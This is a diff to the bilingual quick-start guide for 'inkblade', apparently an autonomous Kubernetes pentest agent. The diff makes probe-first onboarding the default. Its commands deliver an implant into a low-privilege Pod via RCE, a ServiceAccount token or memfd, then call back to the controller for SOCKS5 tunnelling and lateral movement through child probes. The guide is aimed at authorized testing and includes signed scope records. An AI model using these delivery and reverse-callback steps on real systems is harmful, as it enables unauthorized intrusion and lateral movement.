@@ -1,11 +1,11 @@
 # 快速开始 / Quick start
 
-从安装到第一次自主检测：安装 → `inkblade up` → 签授权 → 导入 kubeconfig / 启动探针 → `agent run`。全部步骤面向真实授权环境。
+探针优先接入：安装并启动 → 浏览器登录 → 接入已有探针/立足点 → 通过探针通道投放与横向 → `agent run`。默认立足点是普通、最低权限的 Pod（非 root、无 hostPath/privileged、无 kubeconfig，仅出站 TCP）；kubeconfig 不是前置条件。
 
-## 1. 安装
+## 1. 安装并启动
 
 ```bash
-pip install inkblade
+pip install inkblade && inkblade up --no-consent
 ```
 
 从源码检出安装：
@@ -26,12 +26,6 @@ docker run --rm -it -p 127.0.0.1:8765:8765 -v inkblade-data:/data \
   inkblade:latest --home /data up --host 0.0.0.0 --foreground --no-browser --no-consent
 ```
 
-## 2. 启动接入向导
-
-```bash
-inkblade up --no-consent
-```
-
 `up` 做四件事：
 
 1. 自检：Python 版本、工作区可写、磁盘余量、端口可用。
@@ -39,38 +33,96 @@ inkblade up --no-consent
 3. 生成 `admin` 随机密码，只打印一次；`users.json` 只存 scrypt 哈希。
 4. 启动本地控制台 `127.0.0.1:8765` 并尝试打开浏览器。
 
-`--no-consent` 表示不预签任何范围，授权由下一步显式完成。重复执行是幂等的：不重建工作区、不重印密码、不重复起进程。
+`--no-consent` 表示不预签任何范围，授权由登录后显式完成。重复执行是幂等的：不重建工作区、不重印密码、不重复起进程。
 
-## 3. 签授权
+## 2. 浏览器登录
+
+打开 `127.0.0.1:8765`，用 `admin` 和首次启动打印的密码登录。首次投放前在控制台签署授权记录，或执行：
 
 ```bash
 inkblade quickstart
 ```
 
-五个问题：目标、范围、级别、用户、签署。记录哈希钉存，绑定目标、范围、时间窗和应急联系人。也可以用控制台的授权页签署。`inkblade roe` 查看当前授权状态。
+记录绑定目标、范围、级别、时间窗和应急联系人；`inkblade roe` 查看当前授权状态。
 
-## 4. 导入 kubeconfig 并启动探针
+## 3. 接入已有探针
+
+默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。探针主动回连控制端，不需要在 Pod 上开监听端口。
+
+```bash
+inkblade probe list
+inkblade channel listen
+```
+
+控制端用 `channel listen` 等待连接；在 Pod 内让探针回连：
+
+```bash
+inkblade-probe reverse --host <controller> --port <port>
+```
+
+`probe list` 列出工作区里已登记的探针（`probe_id`、父探针、状态、目标）。子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可使用 stdio 通道（`inkblade channel start --session <session-id>`），但默认路径不依赖它。通道只在本地回环暴露 SOCKS5 与端口转发，用于访问目标 Pod 网络内的服务。
+
+## 4. 首次投放（无需 kubeconfig）
+
+### 4.1 已有立足点：foothold
+
+默认场景是普通 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。用已有 shell、ServiceAccount token 或授权 RCE 投放第一颗探针：
 
 ```bash
 inkblade session open \
-  --mode kubeconfig \
-  --workspace ./work \
-  --kubeconfig ~/.kube/config \
-  --namespace ml-team \
-  --pod infer-0
+  --mode foothold \
+  --target <target> \
+  --credential-source pod-shell \
+  --namespace <namespace> \
+  --pod <pod>
 
 inkblade probe deploy \
   --session <session-id> \
-  --via kubectl \
+  --via rce \
   --binary ./inkblade-probe-linux-amd64 \
-  --namespace ml-team \
-  --pod infer-0 \
+  --probe-token-file ./probe.token \
   --allow-write
 ```
 
-`session open` 绑定入口方式、命名空间、Pod 与凭据指纹；`probe deploy` 不带 `--allow-write` 时只出投放计划，带上后才真正投放并注册探针。`probe collect` 拉取快照，确认 SA、挂载、网卡与 GPU 设备符合预期。
+随后在 Pod 内启动探针回连：
 
-## 5. 自主检测与报告
+```bash
+inkblade-probe reverse --host <controller> --port <port>
+```
+
+- `--credential-source` 可取 `pod-shell`、`sa-token` 或 `rce`。
+- `--via rce` 适合低权限 Pod：用授权代码执行入口把探针放到可写临时目录或 memfd；`--via sa-token` 使用已有 ServiceAccount token。
+- 投放后 `probe list` 应出现新的 `probe_id`；`probe collect` 拉取快照，确认真实权限与挂载。
+
+### 4.2 外部入口：external
+
+只有可达服务、没有 shell 时，先用有界证明建立会话：
+
+```bash
+inkblade session open \
+  --mode external \
+  --target <target> \
+  --proof @proof.json
+
+inkblade probe deploy \
+  --session <session-id> \
+  --via rce \
+  --binary ./inkblade-probe-linux-amd64 \
+  --probe-token-file ./probe.token \
+  --allow-write
+```
+
+`external` 只做有界可达性与版本/路由证明；没有立足点前只允许只读侦察。取得授权 RCE 后，探针经该入口投放，随后主动回连控制端。
+
+## 5. 三种入口
+
+| 入口 | 适用场景 | kubeconfig |
+|---|---|---|
+| `foothold` | 默认：最低权限 Pod（非 root、无 hostPath/privileged、仅出站 TCP），已有 shell/SA token/RCE | 不需要 |
+| `external` | 目标可达，先提交有界证明，再经 RCE/回调投放 | 不需要 |
+| `kubeconfig` | 可选的首次批量 bootstrap，一次给多个 Pod 投放 | 可选 |
+
+## 6. 自主检测与报告
 
 ```bash
 inkblade agent run \
@@ -83,18 +135,35 @@ inkblade report --run <run-id> --lang bi
 inkblade export --run <run-id> --format sarif
 ```
 
-`agent run` 打印 `run_id`；`report` 用它渲染双语渗透报告与修复清单；`export` 输出 SARIF、OCSF 或 VEX。运行中可用 `agent status`、`agent trace` 查看，`agent stop` 急停。
+`agent run` 打印 `run_id`；`report` 渲染双语渗透报告与修复清单；`export` 输出 SARIF、OCSF 或 VEX。运行中可用 `agent status`、`agent trace` 查看，`agent stop` 急停。
 
-## 6. 日常命令
+## 7. 可选：kubeconfig 批量投放
+
+持有运维 kubeconfig、需要一次 bootstrap 多个 Pod 时：
+
+```bash
+inkblade session open \
+  --mode kubeconfig \
+  --kubeconfig ~/.kube/config \
+  --namespace <namespace> \
+  --pod <pod>
+
+inkblade probe deploy \
+  --session <session-id> \
+  --via kubectl \
+  --binary ./inkblade-probe-linux-amd64 \
+  --allow-write
+```
+
+这是高级路径，不是快速开始的前置步骤；首批探针就绪后，后续动作同样走探针通道。
+
+## 8. 日常命令与参数
 
 ```bash
 inkblade up        # 启动控制台（幂等）
 inkblade status    # 进程、授权、用户、证据
 inkblade down      # 停止控制台（幂等）
-inkblade ui        # 只启动控制台
 ```
-
-## 7. 常用参数
 
 | Flag | 作用 |
 |---|---|
@@ -104,9 +173,9 @@ inkblade ui        # 只启动控制台
 | `--no-browser` | 不自动打开浏览器 |
 | `--no-ui` | 只初始化工作区，不启动控制台 |
 | `--foreground` | 前台运行（容器/systemd） |
-| `--no-consent` | 不预签任何范围，由 `quickstart` 显式签署 |
+| `--no-consent` | 不预签任何范围，由登录后显式签署 |
 
-## 8. 下一步
+## 9. 下一步
 
 - 安装方式、离线与 Helm：[`INSTALL.md`](INSTALL.md)
 - 完整命令与工作流：[`USAGE.md`](USAGE.md)
@@ -116,6 +185,34 @@ inkblade ui        # 只启动控制台
 
 ## English
 
-Install, run `inkblade up --no-consent`, sign the authorization record with `inkblade quickstart`, open a session with `inkblade session open --mode kubeconfig`, deliver the probe with `inkblade probe deploy`, then run `inkblade agent run --probe <probe-id> --objective read-only-recon`. `report --run <run-id>` renders the bilingual report; `export` produces SARIF, OCSF or VEX.
+Probe-first onboarding: install and start, sign in, attach the probe or foothold you already hold, then deliver and move laterally through the probe channel. The default foothold is a least-privilege Pod — non-root, no hostPath or privileged mode, no kubeconfig, outbound TCP only. A kubeconfig is optional.
 
-`up` creates the workspace, prints a one-time admin password, starts the local console on `127.0.0.1:8765` and is idempotent. `--no-consent` leaves authorization to `quickstart`, which binds target, scope, level and time window. Probe delivery without `--allow-write` prints the plan only.
+```bash
+pip install inkblade && inkblade up --no-consent
+```
+
+Open `127.0.0.1:8765`, sign in as `admin` with the one-time password, and sign the authorization record with `inkblade quickstart` or in the console.
+
+Existing probe: the controller listens and the probe connects back.
+
+```bash
+inkblade probe list
+inkblade channel listen
+# in the Pod:
+inkblade-probe reverse --host <controller> --port <port>
+```
+
+First delivery from a least-privilege foothold (no kubeconfig):
+
+```bash
+inkblade session open --mode foothold --target <target> \
+  --credential-source pod-shell --namespace <namespace> --pod <pod>
+inkblade probe deploy --session <session-id> --via rce \
+  --binary ./inkblade-probe-linux-amd64 \
+  --probe-token-file ./probe.token --allow-write
+inkblade-probe reverse --host <controller> --port <port>
+```
+
+Child probes are delivered from the parent with `probe upload` + `probe spawn` and call back the controller the same way. A stdio channel (`channel start --session <id>`) remains available when a local command transport exists.
+
+`external` entry uses a bounded reachability proof and then an authorized RCE or callback you already control to place the probe. `kubeconfig` remains an optional batch bootstrap for several Pods. After the first probe is ready, `agent run --probe <probe-id> --objective read-only-recon` and `report --run <run-id>` complete the flow.
